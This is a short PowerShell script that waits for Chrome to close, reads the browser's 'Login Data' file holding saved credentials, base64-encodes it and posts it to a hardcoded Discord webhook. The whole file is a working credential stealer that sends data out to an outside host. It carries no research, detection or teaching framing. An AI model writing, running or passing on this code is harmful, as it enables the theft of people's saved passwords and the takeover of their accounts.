# Path to the Chrome Login Data file
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Function to wait until Chrome is fully closed
function Wait-ForChromeToClose {
    while (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
        Write-Host "Waiting for Chrome to close..."
        Start-Sleep -Seconds 3
    }
}

# Wait for Chrome to close before accessing the file
Wait-ForChromeToClose

# After Chrome is closed, verify file exists
if (-Not (Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Try to read the file bytes safely with retries if locked
$maxRetries = 5
$retryCount = 0
$fileBytes = $null

while (-not $fileBytes -and $retryCount -lt $maxRetries) {
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    }
    catch {
        Write-Host "File locked or inaccessible, retrying in 2 seconds..."
        Start-Sleep -Seconds 2
        $retryCount++
    }
}

if (-not $fileBytes) {
    Write-Host "Failed to read file after $maxRetries attempts."
    exit
}

# Convert file bytes to Base64 string for safe transmission
$fileBase64 = [Convert]::ToBase64String($fileBytes)

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Prepare JSON payload
$payload = @{
    content = "Base64 preview of Login Data:`n$fileBase64"
} | ConvertTo-Json -Depth 3

# Send the POST request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

Write-Host "Base64 preview sent to Discord webhook."
